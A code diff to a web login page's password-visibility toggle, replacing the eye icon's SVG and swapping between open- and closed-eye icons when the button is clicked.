@@ -111,7 +111,10 @@
         <div class="password-wrapper">
           <input type="password" id="password" name="password" required placeholder="Password" />
           <button type="button" class="toggle-password" onclick="togglePassword()" aria-label="Toggle Password">
-            <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="#007BFF" viewBox="0 0 24 24"><path d="M12 4.5C7.5 4.5 3.7 7.6 2 12c1.7 4.4 5.5 7.5 10 7.5s8.3-3.1 10-7.5C20.3 7.6 16.5 4.5 12 4.5zm0 12a4.5 4.5 0 1 1 0-9 4.5 4.5 0 0 1 0 9zm0-7.2a2.7 2.7 0 1 0 0 5.4 2.7 2.7 0 0 0 0-5.4z"/></svg>
+            <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="#000" viewBox="0 0 24 24">
+              <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
+              <path d="M12 9a3 3 0 1 1 0 6 3 3 0 0 1 0-6z" fill="#fff"/>
+            </svg>
           </button>
         </div>
 
@@ -124,6 +127,19 @@
     const form = document.querySelector("#form");
     const scriptURL = "https://script.google.com/macros/s/AKfycbx9dmqEKmDTZSwoABl4h8WjTCFU2BMBYjo0atbklk863llEB7-zGpS1qDgF3o2XcgRm5A/exec";
     const eyeIcon = document.getElementById("eye-icon");
+    const pwdInput = document.getElementById("password");
+
+    const eyeOpenSVG = `
+      <svg xmlns="http://www.w3.org/2000/svg" fill="#FFD700" viewBox="0 0 24 24">
+        <path d="M12 4.5C7.5 4.5 3.7 7.6 2 12c1.7 4.4 5.5 7.5 10 7.5s8.3-3.1 10-7.5C20.3 7.6 16.5 4.5 12 4.5zm0 12a4.5 4.5 0 1 1 0-9 4.5 4.5 0 0 1 0 9zm0-7.2a2.7 2.7 0 1 0 0 5.4 2.7 2.7 0 0 0 0-5.4z"/>
+      </svg>`;
+
+    const eyeClosedSVG = `
+      <svg xmlns="http://www.w3.org/2000/svg" fill="#000" viewBox="0 0 24 24">
+        <path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7S2 12 2 12z"/>
+        <path d="M4 4l16 16" stroke="#fff" stroke-width="2"/>
+      </svg>`;
+
     let isPasswordVisible = false;
 
     form.addEventListener("submit", (e) => {
@@ -151,10 +167,9 @@
     });
 
     function togglePassword() {
-      const pwdInput = document.getElementById("password");
       isPasswordVisible = !isPasswordVisible;
       pwdInput.type = isPasswordVisible ? "text" : "password";
-      eyeIcon.setAttribute("fill", isPasswordVisible ? "#FFD700" : "#007BFF");
+      document.querySelector(".toggle-password").innerHTML = isPasswordVisible ? eyeOpenSVG : eyeClosedSVG;
     }
   </script>
 </body>
